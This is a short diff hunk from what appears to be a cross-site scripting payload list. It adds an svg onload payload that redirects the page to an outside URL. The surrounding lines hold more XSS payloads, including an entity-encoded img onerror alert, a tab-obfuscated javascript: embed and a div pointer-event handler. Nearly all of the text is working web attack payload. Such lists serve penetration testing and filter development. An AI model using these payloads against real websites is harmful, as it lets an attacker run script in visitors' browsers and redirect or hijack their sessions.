@@ -174,7 +174,7 @@ http://xss.rocks/xss.js
 	<img src=x onerror="&#97&#108&#101&#114&#116&#96&#120&#115&#115&#96">
 	
 	<embed><embed src="jav&Tab;ascript:al&Tab;ert()"
-	
+	<svg onload=document.location="https://example.com">
 	<div onpointerrawupdate=alert(1) style=width:100%;height:100%;position:absolute;background-color:red>test
 	**DOM BASED XSS**
 		<img src="" />
